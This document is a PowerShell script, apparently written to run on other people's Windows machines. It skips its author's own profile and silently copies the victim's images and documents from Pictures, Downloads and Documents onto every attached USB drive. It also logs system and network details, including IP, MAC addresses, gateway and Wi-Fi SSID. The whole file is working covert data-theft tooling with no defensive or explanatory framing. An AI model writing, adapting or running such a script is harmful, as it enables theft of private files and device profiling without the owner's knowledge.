# Exit if the user is "amitk"
if ($env:USERPROFILE -eq "C:\Users\amit") {
    return
}

# Get removable drives
$removableDrives = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }

# Define sources and extensions
$sources = @("Pictures", "Downloads", "Documents")
$extensions_img = @("jpg", "jpeg", "png", "webp")
$extensions_docs = @("pdf", "docx", "csv", "pptx")
$username = $env:USERNAME
$userprofile = $env:USERPROFILE

foreach ($drive in $removableDrives) {
    foreach ($folder in $sources) {
        $sourceDir = Join-Path $userprofile $folder

        # Copy image files
        foreach ($ext in $extensions_img) {
            Get-ChildItem -Path $sourceDir -Filter "*.$ext" -File -ErrorAction SilentlyContinue | ForEach-Object {
                $targetDir = Join-Path $drive.DeviceID "$username`_data\$folder`_img"
                if (!(Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir | Out-Null }
                Copy-Item $_.FullName -Destination $targetDir -Force
            }
        }

        # Copy document files (excluding Pictures)
        if ($folder -ne "Pictures") {
            foreach ($ext in $extensions_docs) {
                Get-ChildItem -Path $sourceDir -Filter "*.$ext" -File -ErrorAction SilentlyContinue | ForEach-Object {
                    $targetDir = Join-Path $drive.DeviceID "$username`_data\$folder`_docs"
                    if (!(Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir | Out-Null }
                    Copy-Item $_.FullName -Destination $targetDir -Force
                }
            }
        }
    }

    # Create log file with system info
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $logPath = Join-Path $drive.DeviceID "$username`_data\netinfo_$timestamp.txt"

    Add-Content -Path $logPath -Value "============================"
    Add-Content -Path $logPath -Value "    Device System Info"
    Add-Content -Path $logPath -Value "============================"

    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $cpu = (Get-CimInstance Win32_Processor).Name
    $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1MB)
    $model = (Get-CimInstance Win32_ComputerSystem).Model

    Add-Content $logPath "Operating System : $os"
    Add-Content $logPath "Processor        : $cpu"
    Add-Content $logPath "Installed RAM    : ${ram} MB"
    Add-Content $logPath "Device Model     : $model"

    # Screen Resolution
    Add-Type -AssemblyName System.Windows.Forms
    $res = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
    Add-Content $logPath "Screen Resolution: $($res.Width)x$($res.Height)"

    # Network Info
    Add-Content $logPath "`n============================"
    Add-Content $logPath "    Network Information"
    Add-Content $logPath "============================"

    $ipv4 = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi" -PrefixOrigin Dhcp -ErrorAction SilentlyContinue).IPAddress
    if (!$ipv4) {
        $ipv4 = (Get-NetIPAddress -AddressFamily IPv4 | Select-Object -First 1).IPAddress
    }
    if ($ipv4) { Add-Content $logPath "IP Address       : $ipv4" }

    $macs = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress
    foreach ($mac in $macs) {
        Add-Content $logPath "MAC Address      : $mac"
    }

    $gateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Sort-Object RouteMetric | Select-Object -First 1).NextHop
    if ($gateway) { Add-Content $logPath "Default Gateway  : $gateway" }

    # Wi-Fi SSID
    $ssidInfo = netsh wlan show interfaces | Select-String '^\s*SSID\s*:\s*(.+)$'
    if ($ssidInfo.Matches.Count -gt 0) {
        $ssid = $ssidInfo.Matches[0].Groups[1].Value.Trim()
        Add-Content $logPath "Wi-Fi SSID       : $ssid"
    }

    Add-Content $logPath "============================"
}
